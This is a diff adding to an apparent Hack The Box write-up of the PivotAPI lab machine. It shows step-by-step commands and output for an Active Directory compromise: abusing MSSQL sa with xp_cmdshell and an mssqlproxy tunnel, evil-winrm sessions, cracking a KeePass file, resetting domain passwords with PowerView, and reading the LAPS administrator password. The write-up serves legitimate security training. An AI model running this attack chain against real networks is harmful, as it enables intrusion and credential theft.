@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/pivotapi.png
-tags: ["HTB"]
+tags: ["HTB", "active-directory", "exiftool", "as-rep-roast", "getuserspns", "hashcat", "mssql", "mssqlclient", "bloodhound", "smbmap", "smbclient", "mbox", "mutt", "msgconvert", "reverse-engineering", "procmon", "vbs", "api-monitor", "crackmapexec", "mssql-shell", "mssqlproxy", "evil-winrm", "keepass", "genericall", "powersploit", "powerview", "tunnel", "dotnet", "dnspy", "forcechangepassword", "laps", "winpeas", "powershell-run-as"]
 ---
 
 # PivotAPI
@@ -536,6 +536,565 @@ MSSQL       10.10.10.240    1433   PIVOTAPI         [+] sa:#mssql_s3rV1c3!2020 (
 
 - We can use [mssql_shell](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py)
   - or `impacket-mssqlclient` with `xp_cmdshell` to get a reverse shell
+  - Download `nc` and execute to it to get reverse shell
+  - But this is uninteded way
+```
+└─$ impacket-mssqlclient sa:'#mssql_s3rV1c3!2020'@10.10.10.240                                      
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> xp_cmdshell
+output   
+------   
+NULL     
+
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+
+NULL                   
+```
+
+- Intended way is to use [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)
+  - [python3 version](https://github.com/0xdf-0xdf/mssqlproxy/)
+  - Download 2 `dlls` from releases 
+    - Rename `assembly.dll` to `Microsoft.SqlServer.Proxy.dll`
+```
+└─$ git clone https://github.com/0xdf-0xdf/mssqlproxy -b python3
+Cloning into 'mssqlproxy'...
+remote: Enumerating objects: 36, done.
+remote: Counting objects: 100% (36/36), done.
+remote: Compressing objects: 100% (31/31), done.
+remote: Total 36 (delta 13), reused 23 (delta 4), pack-reused 0
+Receiving objects: 100% (36/36), 172.33 KiB | 625.00 KiB/s, done.
+Resolving deltas: 100% (13/13), done.
+```
+```
+└─$ mv assembly.dll Microsoft.SqlServer.Proxy.dll
+```
+- Now we connect to box and upload second dll `reciclador.dll` there
+  - change `import thread` to `import _thread`
+```
+└─$ python3 mssqlclient.py sa:#mssql_s3rV1c3!2020@10.10.10.240'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL> enable_ole
+SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
+[+] Uploading 'reciclador.dll' to 'C:\windows\temp\reciclador.dll'...
+[+] Size is 111616 bytes
+[+] Upload completed
+SQL> 
+```
+```
+└─$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -install -clr Microsoft.SqlServer.Proxy.dll
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[*] Proxy mode: install
+[*] CLR enabled
+[*] Assembly successfully installed
+[*] Procedure successfully installed
+```
+```
+└─$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -check -reciclador 'C:\windows\temp\reciclador.dll'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[*] Proxy mode: check
+[*] Assembly is installed
+[*] Procedure is installed
+[*] reciclador is installed
+[*] clr enabled
+```
+```
+└─$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -start -reciclador 'C:\windows\temp\reciclador.dll'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[*] Proxy mode: check
+[*] Assembly is installed
+[*] Procedure is installed
+[*] reciclador is installed
+[*] clr enabled
+[*] Proxy mode: start
+[*] Triggering Proxy Via MSSQL, waiting for ACK
+[*] ACK from server!
+[*] Listening on port 1337...
+```
+- Now if we check `netstat`, we have `1137` port listening
+```
+└─$ sudo netstat -tulpn | grep 1337
+[sudo] password for kali: 
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      245854/python3 
+```
+
+- Add entry `socks5  127.0.0.1 1337` to `/etc/proxychains.conf`
+- Since we saw that `svc_mssql` is has `winrm` rights, if we check `winrm` port it's open
+```
+└─$ proxychains nmap -Pn -p 5985 127.0.0.1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 13:45 BST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.35s latency).
+
+PORT     STATE SERVICE
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
+```
+
+- Now we can `evil-winrm`
+```
+└─$  proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_mssql\Documents> 
+```
+## User #1
+- If we check `svc_mssql`'s desktop, we have creds
+```
+*Evil-WinRM* PS C:\Users\svc_mssql> ls desktop
 
 
+    Directorio: C:\Users\svc_mssql\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/8/2020  10:12 PM           2286 credentials.kdbx
+-a----        4/30/2021  10:39 AM             93 note.txt
+```
+- Download `kdbx` 
+```
+*Evil-WinRM* PS C:\Users\svc_mssql\desktop> type note.txt
+Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.
+*Evil-WinRM* PS C:\Users\svc_mssql\desktop> download credentials.kdbx
+                                        
+Info: Downloading C:\Users\svc_mssql\desktop\credentials.kdbx to credentials.kdbx
+                                        
+Info: Download successful!
+```
+
+- Let's crack it
+```
+└─$ keepass2john credentials.kdbx > credentials.hash
+```
+```
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt credentials.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mahalkita        (credentials)     
+1g 0:00:00:01 DONE (2023-10-12 13:50) 0.7246g/s 144.9p/s 144.9c/s 144.9C/s alyssa..september
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+- Let's find a password
+```
+└─$ echo "mahalkita" | kpcli -kdb credentials.kdbx
+Provide the master password: *************************
+
+KeePass CLI (kpcli) v3.8.1 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help <command>' for details on individual commands.
+
+kpcli:/> ls
+=== Groups ===
+Database/
+kpcli:/> cd Database/
+kpcli:/Database> ls
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Recycle Bin/
+Windows/
+kpcli:/Database>
+```
+
+- I found creds in `Windows` folder
+```
+kpcli:/Database> cd Windows/
+kpcli:/Database/Windows> ls
+=== Entries ===
+0. SSH                                                                    
+kpcli:/Database/Windows> show -f SSH 
+
+ Path: /Database/Windows/
+Title: SSH
+Uname: 3v4Si0N
+ Pass: Gu4nCh3C4NaRi0N!23
+  URL: 
+Notes: 
+
+```
+
+- And they work for `ssh`
+```
+└─$ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh 3v4Si0N@10.10.10.240
+Microsoft Windows [Versión 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>
+```
+
+
+## User #2
+- There is a `Developers` folder, but we don't have access to it
+```
+licordebellota\3v4si0n@PIVOTAPI C:\>dir 
+ El volumen de la unidad C no tiene etiqueta. 
+ El número de serie del volumen es: 94DB-AFCA
+
+ Directorio de C:\
+
+08/08/2020  19:23    <DIR>          Developers
+08/08/2020  12:53    <DIR>          inetpub
+08/08/2020  22:48    <DIR>          PerfLogs
+19/02/2021  14:42    <DIR>          Program Files
+09/08/2020  17:06    <DIR>          Program Files (x86)
+08/08/2020  19:46    <DIR>          Users
+29/04/2021  17:31    <DIR>          Windows
+               0 archivos              0 bytes
+               7 dirs   4.425.191.424 bytes libres
+
+licordebellota\3v4si0n@PIVOTAPI C:\>dir Developers 
+ El volumen de la unidad C no tiene etiqueta. 
+ El número de serie del volumen es: 94DB-AFCA
+
+ Directorio de C:\Developers
+
+No se encuentra el archivo
+```
+
+- The `bloodhound` shows `GenericAll` rights over few users
+
+![](./images/13.png)
+
+- We know there is a `developers` group in the domain
+  - We could assume they have access to that folder
+```
+licordebellota\3v4si0n@PIVOTAPI C:\>net group /domain
+
+Cuentas de grupo de \\PIVOTAPI
+
+-------------------------------------------------------------------------------
+*Administradores clave
+*Administradores clave de la organización
+*Administradores de empresas
+*Administradores de esquema
+*Admins. del dominio
+*Controladores de dominio
+*Controladores de dominio clonables
+*Controladores de dominio de sólo lectura
+*Developers
+*DnsUpdateProxy
+*Enterprise Domain Controllers de sólo lectura
+*Equipos del dominio
+*Invitados del dominio
+*LAPS ADM
+*LAPS READ
+*Propietarios del creador de directivas de grupo
+*Protected Users
+*Usuarios del dominio
+*WinRM
+Se ha completado el comando correctamente.
+
+```
+
+- If we specify the target as `Developers` in `bloodhound`, we see  the path
+
+![](./images/14.png)
+
+- Let's download `Powerview` and change `Dr.Zaiuss`'s password
+```
+└─$ sshpass -p 'Gu4nCh3C4NaRi0N!23' scp powerview.ps1 3v4Si0N@10.10.10.240:'C:\programdata\powerview.ps1'
+```
+
+- Change the password
+```
+PS C:\Programdata> import-module .\powerview.ps1 
+PS C:\Programdata> $pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force 
+PS C:\Programdata> Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass 
+PS C:\Programdata>  
+```
+
+- `dr.zaiuss` is not `ssh` user, but has rights to `winrm`
+  - We can configure port forwarding via `ssh`
+  - And connect as `dr.zaiuss`
+```
+└─$ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh 3v4Si0N@10.10.10.240 -L 5985:127.0.0.1:5985
+Microsoft Windows [Versión 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>
+```
+
+- And now connect as `dr.zaiuss`
+```
+└─$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'P@ssw0rd123' 
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents> 
+```
+## User #3
+- Now we change `superfume`'s password
+```
+*Evil-WinRM* PS C:\programdata> import-module .\powerview.ps1
+*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force 
+*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity superfume -AccountPassword $pass
+*Evil-WinRM* PS C:\programdata>
+```
+
+- Now connect to `winrm`
+```
+└─$ evil-winrm -i 127.0.0.1 -u superfume -p 'P@ssw0rd123' 
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\superfume\Documents> 
+```
+
+## User #4
+- Now we can access `Developers` folder
+
+```
+*Evil-WinRM* PS C:\Developers> dir
+
+
+    Directorio: C:\Developers
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         8/8/2020   7:26 PM                Jari
+d-----         8/8/2020   7:23 PM                Superfume
+
+```
+
+- We have 2 files inside `Jari`'s folder
+```
+*Evil-WinRM* PS C:\Developers>ls jari
+
+
+    Directorio: C:\Developers\jari
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/8/2020   7:26 PM           3676 program.cs
+-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe
+```
+
+- Download them
+```
+
+```
+
+- `program.cs` indicates that it uses `Jari`'s creds, but it's incomplete
+  - The password is decrypted using `RC4` before restarting the service
+  - But it's empty
+
+![](./images/15.png)
+
+- Let's reverse engineer the binary
+
+![](./images/16.png)
+
+- We can set a breakpoint and start it
+  - We see an `array`
+  - Right-click and `Show in Memory Window`
+  - We see our password
+
+![](./images/17.png)
+
+![](./images/18.png)
+
+![](./images/19.png)
+
+![](./images/20.png)
+
+- And we can `winrm`
+```
+└─$ evil-winrm -i 127.0.0.1 -u jari -p 'Cos@Chung@!RPG'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jari\Documents> 
+
+```
 ## Root
+- We have a path to `Laps Adm` and `Laps Read` groups
+  - [LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
+
+![](./images/21.png)
+
+- We have to change `gibdeon`'s password, who's a member of [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)
+  - `Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.`
+```
+*Evil-WinRM* PS C:\programdata> import-module .\poweview.ps1
+*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
+*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass
+*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('gibdeon', $pass)
+```
+
+- Now we can execute commands a `gibdeon`
+  - I'll add `jari` to `LAPS Read` group
+```
+*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Credential $cred -Members 'jari'
+*Evil-WinRM* PS C:\programdata> whoami /groups
+
+INFORMACIàN DE GRUPO
+--------------------
+
+Nombre de grupo                                                    Tipo           SID                                           Atributos
+================================================================== ============== ============================================= ========================================================================
+Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+LICORDEBELLOTA\Developers                                          Grupo          S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+LICORDEBELLOTA\WinRM                                               Grupo          S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
+*Evil-WinRM* PS C:\programdata> exit
+                                        
+Info: Exiting with code 0                                      
+```
+
+- Relogin for the changes to take effect
+```
+└─$ evil-winrm -i 127.0.0.1 -u jari -p 'Cos@Chung@!RPG'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jari\Documents> whoami /groups
+
+INFORMACIàN DE GRUPO
+--------------------
+
+Nombre de grupo                                                    Tipo           SID                                           Atributos
+================================================================== ============== ============================================= ========================================================================
+Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+LICORDEBELLOTA\Developers                                          Grupo          S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+LICORDEBELLOTA\LAPS READ                                           Grupo          S-1-5-21-842165252-2479896602-2762773115-1114 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+LICORDEBELLOTA\WinRM                                               Grupo          S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
+```
+
+- Retrieve password
+```
+*Evil-WinRM* PS C:\Users\jari\Documents> Get-ADComputer PivotAPI -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
+DNSHostName       : PivotAPI.LicorDeBellota.htb
+Enabled           : True
+ms-mcs-admpwd     : hrn38Rhix9Tdx7XR2XG4
+Name              : PIVOTAPI
+ObjectClass       : computer
+ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
+SamAccountName    : PIVOTAPI$
+SID               : S-1-5-21-842165252-2479896602-2762773115-1004
+UserPrincipalName :
+```
+
+- Now we can `winrm` as `Administrador`
+```
+└─$ evil-winrm -i 127.0.0.1 -u administrador -p 'hrn38Rhix9Tdx7XR2XG4'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\administrador\Documents> 
+```
